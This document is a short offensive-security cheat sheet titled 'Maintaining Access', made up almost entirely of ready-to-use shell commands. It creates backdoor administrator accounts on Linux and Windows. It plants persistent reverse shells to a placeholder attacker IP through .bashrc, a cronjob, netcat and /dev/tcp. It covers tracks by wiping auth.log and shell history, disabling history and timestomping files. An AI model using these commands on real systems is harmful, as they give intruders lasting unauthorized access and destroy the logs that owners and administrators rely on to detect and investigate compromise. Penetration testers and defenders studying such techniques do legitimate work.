# Maintaining Access

## Adding a Backdoor User

```bash
# Create a new user (Linux)
useradd -m -s /bin/bash backdoor
passwd backdoor

# Add user to sudo group
usermod -aG sudo backdoor

# Create a user in Windows
net user backdoor <PASSWORD> /add
net localgroup administrators backdoor /add
```

## Creating a Persistent Backdoor

```bash
# Using netcat for persistence (Linux)
echo "nc -e /bin/bash <ATTACKER_IP> <PORT> &" >> ~/.bashrc

# Using a cronjob
(crontab -l 2>/dev/null; echo "*/5 * * * * nc -e /bin/bash <ATTACKER_IP> <PORT>") | crontab -

# Backdooring .bashrc
echo '#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' >> ~/.bashrc
```

## Covering Tracks

```bash
# Clear logs
echo "" > /var/log/auth.log
echo "" > ~/.bash_history

# Remove command history
history -c
export HISTSIZE=0

# Timestomp (Linux)
touch -r reference_file modified_file

# Hide processes
ps aux | grep <process_name>
kill -9 <process_id>
```
